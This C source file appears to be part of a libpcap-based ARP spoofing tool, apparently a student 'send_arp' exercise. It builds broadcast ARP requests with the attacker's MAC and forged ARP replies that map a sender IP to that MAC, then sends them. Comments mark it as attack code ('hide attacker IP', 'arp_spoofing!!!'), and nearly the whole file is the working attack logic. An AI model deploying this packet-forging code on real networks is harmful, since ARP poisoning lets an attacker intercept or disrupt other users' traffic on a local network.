#include <sfdafx.h>
#include <send_arp.h>


void ARP_REQ_ToTarget_Set(const char *dev, ARP *Tar_ARP_Pac,uint32_t SenderIP ,uint32_t TargetIP)
{
      unsigned char * Attacker_mac= nullptr;

      // Get_Sender_Mac
        Attacker_mac = find_Attacker_Mac(dev);
        printf("TEST MY_MAC2:");
        for(int i=0; i<6; i++)   printf("%02x",Attacker_mac[i]);
        printf("\n");
        memset(Tar_ARP_Pac->Eth_Header.D_Mac,0xff,6);
        Attacker_mac = find_Attacker_Mac(dev);
        memcpy(Tar_ARP_Pac->Eth_Header.S_Mac,Attacker_mac,6);
        Tar_ARP_Pac->Eth_Header.Eth_type=htons(ARP_Number);
        Tar_ARP_Pac->ARP_Header.HW_Type=htons(0x0001);
        Tar_ARP_Pac->ARP_Header.PT_Type=htons(IP_Number);
        Tar_ARP_Pac->ARP_Header.HAL=0X06;
        Tar_ARP_Pac->ARP_Header.PAL=0x04;
        Tar_ARP_Pac->ARP_Header.Oper_Code =htons(OC_Req); //Operate Code = 1,  ARP Request
        for(int i=0; i<6; i++)Tar_ARP_Pac->ARP_Header.SHW_Adr[i] =Tar_ARP_Pac->Eth_Header.S_Mac[i];
        Tar_ARP_Pac->ARP_Header.SPT_Adr= htonl(0XC0A82B88);//0x00000000; //hide attacker IP, I should change later..
        memset(Tar_ARP_Pac->ARP_Header.DHW_Adr,0X00,6);
        Tar_ARP_Pac->ARP_Header.DPT_Adr=TargetIP;
}
// get gateway mac and send Req, Rep

void ARP_REP_ToTarget_Set(ARP * Tar_ARP_Pac,const char * argv[] ,const u_char* packet) // attacker mac, sender ip ;
{

    for(int i=0; i<6; i++)
         {
            Tar_ARP_Pac->Eth_Header.D_Mac[i] =packet[22+i];
            Tar_ARP_Pac->ARP_Header.DHW_Adr[i]=packet[22+i];
         }

          Tar_ARP_Pac->ARP_Header.SPT_Adr= inet_addr(argv[2]); //Sender IP
          Tar_ARP_Pac->ARP_Header.DPT_Adr= inet_addr(argv[3]);//Target IP
           Tar_ARP_Pac->ARP_Header.Oper_Code =htons(OC_Rep);// ARP reply
}

void Send_ARP_ToTarget(pcap_t* handle, ARP  *Tar_ARP_Pac, int packet_size)
{
    pcap_sendpacket(handle,(unsigned char *)Tar_ARP_Pac,packet_size); //arp_spoofing!!!
    printf("Success ARP Spoofing to Target!\n");
}
